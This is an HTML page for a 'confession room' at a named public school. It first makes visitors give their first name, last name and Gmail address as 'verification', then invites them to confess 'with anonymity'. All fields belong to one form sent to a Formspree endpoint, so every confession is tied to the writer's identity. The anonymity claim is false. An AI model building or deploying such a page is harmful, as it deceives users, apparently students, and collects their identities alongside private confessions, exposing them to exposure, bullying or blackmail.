<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MKDAV Confessions</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #0f172a; /* Dark Navy Background */
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        /* The main card that holds everything */
        .card {
            background: #1e293b;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 400px;
            text-align: center;
            border: 1px solid #334155;
        }

        h1 { color: #38bdf8; font-size: 1.8rem; margin-top: 0; margin-bottom: 5px; }
        p { color: #94a3b8; font-size: 0.95rem; margin-bottom: 25px; }

        /* Hide Page 2 initially */
        #page2 { display: none; }

        input, textarea {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: white;
            box-sizing: border-box;
            font-size: 1rem;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: #38bdf8;
        }

        .btn {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
        }

        .btn:hover { background-color: #0284c7; color: white; }

        .back-btn {
            color: #64748b;
            font-size: 0.9rem;
            margin-top: 20px;
            cursor: pointer;
            text-decoration: underline;
            display: inline-block;
        }
    </style>
</head>
<body>

    <form action="https://formspree.io/f/xjgpeyvq" method="POST" class="card">
        
        <div id="page1">
            <h1>Verification</h1>
            <p>Please verify your identity to enter the room.</p>
            
            <input type="text" name="First_Name" id="fname" placeholder="First Name" required>
            <input type="text" name="Last_Name" id="lname" placeholder="Last Name" required>
            <input type="email" name="Email" id="email" placeholder="Gmail Address" required>
            
            <button type="button" class="btn" onclick="goToConfession()">Enter Room</button>
        </div>

        <div id="page2">
            <h1>MKDAV Public School</h1>
            <p>Write your confession here with anonymity.</p>
            
            <textarea name="Confession" rows="6" placeholder="I confess that..." required></textarea>
            
            <button type="submit" class="btn">Submit Confession</button>
            <br>
            <span class="back-btn" onclick="goBack()">← Back to Verification</span>
        </div>

    </form>

    <script>
        function goToConfession() {
            // Check if the user filled out the first page before letting them proceed
            let fName = document.getElementById('fname').value;
            let lName = document.getElementById('lname').value;
            let email = document.getElementById('email').value;

            if (fName !== "" && lName !== "" && email !== "") {
                document.getElementById('page1').style.display = 'none';
                document.getElementById('page2').style.display = 'block';
            } else {
                alert("Please fill out all fields to enter the confession room.");
            }
        }

        function goBack() {
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page1').style.display = 'block';
        }
    </script>

</body>
</html>
